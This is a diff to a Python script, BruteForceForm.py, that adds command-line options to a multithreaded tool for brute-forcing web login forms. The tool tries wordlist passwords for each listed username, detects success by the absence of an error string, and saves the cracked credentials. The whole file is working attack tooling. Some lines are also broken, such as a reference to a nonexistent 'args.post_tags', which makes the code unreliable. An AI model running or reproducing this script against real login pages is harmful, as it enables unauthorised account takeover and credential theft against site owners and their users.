@@ -3,21 +3,19 @@ import threading
 import queue
 from html.parser import HTMLParser
 import requests
+import argparse
+from argparse import RawTextHelpFormatter # for newline in description
 
 ### refer to README.md for usage and explanations
 
 user_thread = 10
-username_file = "username_file.txt"
-wordlist_file = "passwords.txt"
-output_file = "output.txt"
 resume = None
-target_url = "<url_to_target>"
-target_post = "<url_to_target_post>"
+target_url = None
+target_post = None
 username_field = "username"
 password_field = "password"
-error_check = "Wrong username and password" # change to appropriate text
+error_check = "Wrong username and password"
 
-output = open(output_file, 'w')
 
 def copy_of_queue(old_queue):
 	new_queue = queue.Queue()
@@ -69,11 +67,11 @@ class BruteParser(HTMLParser):
 				self.tag_results[tag_name] = value 
 
 class Bruter(object):
-	def __init__(self, username, words):
+	def __init__(self, username, words, output):
 		self.username = username
 		self.password_q = words
 		self.found = False
-
+		self.output = output
 		print("Finished setting up for: %s" % username)
 
 	def run_bruteforce(self):
@@ -110,14 +108,53 @@ class Bruter(object):
 				if error_check not in login_result:
 					self.found = True
 					wr = self.username + ':' + brute + '\n'
-					output.write(wr)
+					if output: output.write(wr)
 					print("FOUND %s" % brute)
 
-words = build_wordlist(wordlist_file)
-with open(username_file) as f:
-	for username in f:
-		bruter = Bruter(username.strip(" \n"), copy_of_queue(words))
-		threads = bruter.run_bruteforce()
-		for t in threads: t.join() # join all threads
 
-output.close()
+if __name__ == '__main__':
+
+	parser = argparse.ArgumentParser(description='Example commands:\n\
+	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt -e "password didn\'t match"\n\
+	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt --username-field user -e "password didn\'t match"\n\
+	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt --post <post_url> -e "password didn\'t match"\n', formatter_class=RawTextHelpFormatter, prog="./BruteForceForm.py")
+	parser.add_argument("target_url", help="url of target")
+	parser.add_argument("--post", metavar="post url", help="url to post form (defaults to target_url)")
+	parser.add_argument("-u", "--usernames", help="file with usernames", required=True)
+	parser.add_argument("-w", "--wordlist", help="file with passwords", required=True)
+	parser.add_argument("-o", "--output", help="file where found matches will be stored")
+	parser.add_argument("-e", "--error-check", help="error check that should be not be present in response body upon success and present upon fail", required=True)
+	parser.add_argument("--username-field", help="name of username input field")
+	parser.add_argument("--password-field", help="name of password input field")
+	
+	args = parser.parse_args()
+	username_file = args.usernames
+	wordlist_file = args.wordlist
+	target_url = args.target_url
+	error_check = args.error_check
+
+	if args.post:
+		target_post = args.post_tags
+	else:
+		target_post = target_url
+
+	if args.output:
+		output_file = args.output
+	else:
+		output_file = None
+
+	if args.username_field:
+		username_field = args.username_field
+	if args.password_field:
+		password_field = args.password_field
+	
+	output = open(output_file, 'w') if output_file else None
+	words = build_wordlist(wordlist_file)
+	with open(username_file) as f:
+		for username in f:
+			bruter = Bruter(username.strip(" \n"), copy_of_queue(words), output)
+			threads = bruter.run_bruteforce()
+			for t in threads: t.join() # join all threads
+
+	if output:
+		output.close()
